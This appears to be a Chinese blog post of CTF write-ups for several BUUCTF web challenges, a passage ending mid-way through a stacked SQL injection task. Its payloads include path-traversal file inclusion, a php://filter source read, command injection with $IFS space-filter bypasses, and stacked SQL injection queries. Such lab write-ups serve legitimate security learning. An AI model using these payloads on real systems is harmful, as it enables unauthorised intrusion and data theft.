<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Buuctf Recording | Dralin's SweetNest</title><meta name="author" content="Dralin Feng"><meta name="copyright" content="Dralin Feng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历开启靶机,发现是一个大大的滑稽脸。ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。访问这个文件,看到关键源码(就是下面的代码,这里是详细说明) 1234567891011121314151617181920212223242526272829303132333435363738394041">
<meta property="og:type" content="article">
<meta property="og:title" content="Buuctf Recording">
<meta property="og:url" content="http://fzsecurity-github.github.io/2023/10/27/buuojctf/index.html">
<meta property="og:site_name" content="Dralin&#39;s SweetNest">
<meta property="og:description" content="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历开启靶机,发现是一个大大的滑稽脸。ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。访问这个文件,看到关键源码(就是下面的代码,这里是详细说明) 1234567891011121314151617181920212223242526272829303132333435363738394041">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://fzsecurity-github.github.io/img/reHe.jpg">
<meta property="article:published_time" content="2023-10-27T13:21:32.000Z">
<meta property="article:modified_time" content="2023-11-08T10:05:36.777Z">
<meta property="article:author" content="Dralin Feng">
<meta property="article:tag" content="实战练习心得">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fzsecurity-github.github.io/img/reHe.jpg"><link rel="shortcut icon" href="/img/sweetwo.png"><link rel="canonical" href="http://fzsecurity-github.github.io/2023/10/27/buuojctf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Dralin Feng","link":"链接: ","source":"来源: Dralin's SweetNest","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体中文","cht_to_chs":"你已切换为简体中文","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: true,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Buuctf Recording',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-11-08 18:05:36'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/myStyle.css"><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/custom.css"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/reHe.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dralin's SweetNest"><span class="site-name">Dralin's SweetNest</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-envelope-open"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Buuctf Recording</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-27T13:21:32.000Z" title="发表于 2023-10-27 21:21:32">2023-10-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-08T10:05:36.777Z" title="更新于 2023-11-08 18:05:36">2023-11-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Buuctf Recording"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="HCTF-2018-WarmUp–代码审计-文件包含-目录遍历"><a href="#HCTF-2018-WarmUp–代码审计-文件包含-目录遍历" class="headerlink" title="[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历"></a>[HCTF 2018]WarmUp–代码审计|文件包含|目录遍历</h2><p>开启靶机,发现是一个大大的滑稽脸。<br><img src="https://pic.imgdb.cn/item/653bca68c458853aeff5c5cb.jpg" alt="图一" title="滑稽脸"><br>ctrl+u看源码,发现一个source.php被注释了,那么可以想到,这个文件是可以访问的。<br><img src="https://pic.imgdb.cn/item/653bca7bc458853aeff6218b.jpg" alt="图二" title="滑稽脸源码"><br>访问这个文件,看到关键源码(就是下面的代码,这里是详细说明)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)//接收属性值并判断文件名</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<span class="hljs-comment">//白名单验证</span><br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<span class="hljs-comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span><br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//在白名单内的就返回为真</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><span class="hljs-comment">//法一</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(//这里挺关键意思是把接收的值的第一个?前的内容截取<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//截取后判断</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><span class="hljs-comment">//法二</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<span class="hljs-comment">//其实和上面一样,只不过这里是url解码,那就将?编码两次(这里解一次码,服务器也会自动解一次码)其余同法一</span><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<span class="hljs-comment">//这个是三个条件(输入非空、输入的是字符串、且上面的check函数返回为true),最主要的是checkfile函数返回为真,三个条件满足则会得到flag</span><br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-comment">//关键的包含flag文件的函数</span><br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>一些函数的定义:<br>mb_substr： 获取部分字符串。<br>mb_strpos： 查找字符串在另一个字符串中首次出现的位置。<br>in_array($needle, $haystack)：needle待搜索值，haystack待搜索数组。<br>有了上述分析支持后,开始解题。<br>首先根据这段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<span class="hljs-comment">//白名单验证</span><br>          <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<span class="hljs-comment">//这里要求我们输入的必须不可为空且必须为字符串,否则返回错误</span><br>              <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>          &#125;<br><br>          <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<span class="hljs-comment">//在白名单内的就返回为真</span><br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>          &#125;<br></code></pre></td></tr></table></figure>
<p>我先读取一个hint.php文件康康<br><img src="https://pic.imgdb.cn/item/653bca8dc458853aeff68098.jpg" alt="图三" title="hint.php"><br>发现输出flag在ffffllll什么的文件(小寄巧:ffffllllaaaagggg这里flag被写了四次所以使用4或5个..&#x2F; 我tk,第一次做ctf题给我整这是吧?),我们尝试读取,但是由于存在过滤,并不可直接读取,采用以下payload绕过。<br>法一:</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=<span class="hljs-keyword">int</span>.php?..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>
<p>法二(将?url编码两次):</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">?<span class="hljs-keyword">file</span>=hint.php%<span class="hljs-number">253</span>F..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../ffffllllaaaagggg<br></code></pre></td></tr></table></figure>
<p>依此法,可获得flag<br><img src="https://pic.imgdb.cn/item/653bca94c458853aeff69f73.jpg" alt="图四" title="法一绕过输出flag"><br><img src="https://pic.imgdb.cn/item/653bcaf6c458853aeff89f67.jpg" alt="图五" title="法二绕过输出flag"><br>参考:<code>https://blog.csdn.net/Lixunzhe0112/article/details/128716492</code></p>
<h2 id="ACTF2020-新生赛-Include–文件包含-协议玩法"><a href="#ACTF2020-新生赛-Include–文件包含-协议玩法" class="headerlink" title="[ACTF2020 新生赛]Include–文件包含|协议玩法"></a>[ACTF2020 新生赛]Include–文件包含|协议玩法</h2><p>开启靶机,发现有一个超链接,点击进去,只有”can you find out the flag?”,这里我卡了挺久,抓包也抓了;爆路径也尝试了,一无所获。<br><img src="https://pic.imgdb.cn/item/653bd282c458853aef2a63e8.jpg" alt="图六" title="单一的界面"><br>先改造以下超链接(直接指向这一个文件),发现显示页面不变,说明这个超链接是直接指向flag.php的。<br><img src="https://pic.imgdb.cn/item/653bd28ac458853aef2aa9aa.jpg" alt="图七" title="一个小发现"><br>最终参考了wp,学习到以下知识点。<br>1、PHP 中若通过 require()、once_require() 或 include() 、once_include() 函数去包含另一个文件，该文件在网页中均是不可见的（即使你查看网页源代码）。<br>2、可以发现 flag.php 页面通过 get 方式中的参数 file 来包含网站当前目录下的其他文件（如 flag.php），再加上提示 “你能找到其他 flag 吗？” ，我们可以推断，要解答该题目需要获取 flag.php 的源代码。<br>分析过后,我们便有了解决方法。<br>思路:我们可以通过将包含的文件进行转码，让浏览器无法识别这是 PHP 代码，其也就无法执行该 PHP 文件，于是将文件中的内容直接显示出来，我们将通过 PHP 伪协议来完成这一动作。<br>使用 PHP 伪协议将网页源代码转换为 base64 编码的格式：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>构造payload并且访问,得到一串base64编码的数据。<br><img src="https://pic.imgdb.cn/item/653bd29cc458853aef2b3fa3.jpg" alt="图八" title="成功获取关键key"><br>上网找一个在线base64解码工具即可得到flag。</p>
<h2 id="ACTF2020-新生赛-Exec–命令执行"><a href="#ACTF2020-新生赛-Exec–命令执行" class="headerlink" title="[ACTF2020 新生赛]Exec–命令执行"></a>[ACTF2020 新生赛]Exec–命令执行</h2><p>开启靶机,发现是一个简易实现ping命令的文本输入框。<br>那么就是简单的命令执行,说到命令执行,那么就要思考以下几点:<br>1、对方是什么操作系统:windows|linux?<br>2、可不可以多条命令一起执行?<br>首先判断os,这里先抓包看,但是看不出来。<br><img src="https://pic.imgdb.cn/item/653bd9eac458853aef60f2cf.jpg" alt="图九" title="抓包判断os"><br>那么只能盲猜,先用ipconfig再用ifconfig<br>这里ipconfig没反应,但是ifconfig有反应,所以必是linux系统且支持多条命令执行。<br>如127.0.0.1;ifconfig(推荐.;是linux中的管道符)或127.0.0.1;ifconfig。<br><img src="https://pic.imgdb.cn/item/653bdac7c458853aef6559e5.jpg" alt="图十" title="盲猜"><br>知道这一点,那么我们就可以自定义命令找flag了。<br>先查看当前目录,发现只有一个index.php文件,明显flag不存在于此处。<br><img src="https://pic.imgdb.cn/item/653bdaedc458853aef6613bc.jpg" alt="图十一" title="探针到一个文件"><br>使用:”ls -al &#x2F;“ 是一个在命令行中使用的命令。它的作用是列出根目录下所有文件和文件夹的详细信息。<br><img src="https://pic.imgdb.cn/item/653bdb4ac458853aef692236.jpg" alt="图十二" title="发现目标"><br>最后查看flag(这里一定要cat &#x2F;flag而不可以cat flag)<br><img src="https://pic.imgdb.cn/item/653bdb51c458853aef695a75.jpg" alt="图十三" title="获取flag"></p>
<h2 id="GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计"><a href="#GXYCTF2019-Ping-Ping-Ping–命令执行-代码审计" class="headerlink" title="[GXYCTF2019]Ping Ping Ping–命令执行|代码审计"></a>[GXYCTF2019]Ping Ping Ping–命令执行|代码审计</h2><p>开启靶机,提示很明显,就是一个ip属性值接收IP地址ping。<br>但是依旧可以多条命令执行,但是这里用到linux的管道符”;”,原因是在网址栏操作。<br>那么我们先看下ip康康是否支持。<br><img src="https://pic.imgdb.cn/item/653c737dc458853aef34db78.jpg" alt="图十四" title="管道符"><br>确实可以,那么就可以接着往下了。我想一步到位直接读取flag,但是发现空格被过滤了<br><img src="https://pic.imgdb.cn/item/653c73edc458853aef366532.jpg" alt="图十五" title="空格过滤"><br>退而求其次,绕过空格过滤<br>空格的绕过方法为:</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-number">1.</span>$RIFS)替换<br><span class="hljs-number">2.</span>$IFS$1替换<br><span class="hljs-number">3.</span>$KIFS替换<br><span class="hljs-number">4.</span>%20替换<br><span class="hljs-number">5.</span>&lt;和&lt;&gt;重定向符替换<br><span class="hljs-number">6.</span>%09替换<br></code></pre></td></tr></table></figure>
<p>全部进行实验可以发现只有$IFS$1可以绕过但同时也发现flag也被过滤<br><img src="https://pic.imgdb.cn/item/653c73fac458853aef368ed2.jpg" alt="图十六" title="绕过空格但是flag也被过滤"><br>没办法,只可以读取index.php看看过滤规则<br><img src="https://pic.imgdb.cn/item/653c740ec458853aef36d458.jpg" alt="图十七" title="利用代码里面的漏洞进行过滤"><br>可以知道,过滤全是正则,什么大小写都不行,但存在一个变量$a,那么我们可以利用这个进行传参实现绕过。<br>payload:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;a=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1fla</span><span class="hljs-variable">$a</span>.php<br></code></pre></td></tr></table></figure>
<p>这里打开后不会立刻看到flag,那么我们就要坚定内心,坚信自己一定没错究竟是在哪里呢,查看源码成功获取flag。<br><img src="https://pic.imgdb.cn/item/653c7419c458853aef36fd3c.jpg" alt="图十八" title="查看源码获取flag"><br>参考:<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_78136321/article/details/133294740">https://blog.csdn.net/2301_78136321/article/details/133294740</a><br>这道题我觉得是有点恶心的,对于我来说前面已经耗费太多精力了,本想着终于获取到flag了,但是空空如也还看看源码,心态容易崩,还要继续提升。</p>
<h2 id="强网杯-2019-随便注–SQL注入-堆叠注入"><a href="#强网杯-2019-随便注–SQL注入-堆叠注入" class="headerlink" title="[强网杯 2019]随便注–SQL注入|堆叠注入"></a>[强网杯 2019]随便注–SQL注入|堆叠注入</h2><p>开启靶机,是一个熟悉的sql注入题目(有提示)。<br>先判断有无注入点以及是字符型或者数字型。<br>这里测试出来存在注入点以及是字符型(输入1没报错,1’报错)。<br><img src="https://pic.imgdb.cn/item/653c7c44c458853aef5534cd.jpg" alt="图十九" title="判断有无注入点以及是字符型或者数字型"><br>!!!tips:想说一句,看到带输入框的,尽量把注入语句写到框内<br>继续测试,这里用or而非and(原因是前面1’错误,or后面的1&#x3D;1为真,那么总体为真就会把所有数据都输出;而and只会报错输出一个)。<br>也就是:or爆全;and爆一个。<br><img src="https://pic.imgdb.cn/item/653c7c49c458853aef55455b.jpg" alt="图二十" title="or"><br>接着使用order by判断列数。<br><img src="https://pic.imgdb.cn/item/653c7c57c458853aef5575ff.jpg" alt="图二十一" title="order by判断列数"><br><img src="https://pic.imgdb.cn/item/653c7c5ec458853aef558cd9.jpg" alt="图二十二" title="order by判断列数"><br>判断出来是存在两列,猜测是id号+数据。开始真正意义上的注入<br>先来一个union+select(大小写均是一遍)<br>发现存在过滤<br><img src="https://pic.imgdb.cn/item/653c97aac458853aefb6d4a9.jpg" alt="图二十三" title="发现存在过滤"><br>返回一个正则过滤规则，可以看到几乎所有常用的字段都被过滤了。这里尝试过双写绕过，16进制绕过等；不过过滤机制太强，都不行。<br>这里技穷了,没有任何思路,看了下wp,才想到可以堆叠注入(注意使用数据库语句)。<br>先试着查一下数据库</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
<p>成功查询到,说明存在堆叠注入,那么我们后面都围绕堆叠注入展开。<br><img src="https://pic.imgdb.cn/item/653c9845c458853aefb9b864.jpg" alt="图二十四" title="存在堆叠"><br>再爆表<br><img src="https://pic.imgdb.cn/item/653c984cc458853aefb9dd3d.jpg" alt="图二十五" title="堆叠爆表"><br>可以看到当前库下有两张表（1919810931114514和words）。<br>先查words表中的列名</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27;;show columns <span class="hljs-keyword">from</span> <span class="hljs-built_in">words</span>;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
